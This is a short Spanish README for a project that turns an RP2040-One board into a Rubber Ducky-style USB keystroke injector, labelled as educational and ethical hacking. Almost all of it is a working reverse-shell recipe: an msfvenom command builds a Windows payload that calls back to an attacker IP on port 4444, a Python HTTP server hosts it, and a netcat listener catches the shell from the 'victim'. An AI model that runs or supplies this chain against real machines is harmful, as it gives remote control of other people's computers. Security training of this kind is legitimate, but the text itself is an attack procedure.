# Rubber-Teddy
Guía paso a paso para construir, configurar y utilizar un RP2040-One como dispositivo USB HID tipo Rubber Ducky, con fines educativos, aprendizaje de ciberseguridad y hacking ético.

Pasos para realizar el reverse shell:
Generar shell:
Creas una carpeta llamada "shellmalo".
Luego: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.223.128 LPORT=4444 -f exe > shellmalo/shell.exe
Correr server:
cd shellmalo
python -m http.server 8000
Listener de netcat:
-Abre otra terminal
-nc -lvnp 4444
Acción: Una vez ejecutado la shell en la victima, accedes en donde estas corriendo netcat.
 
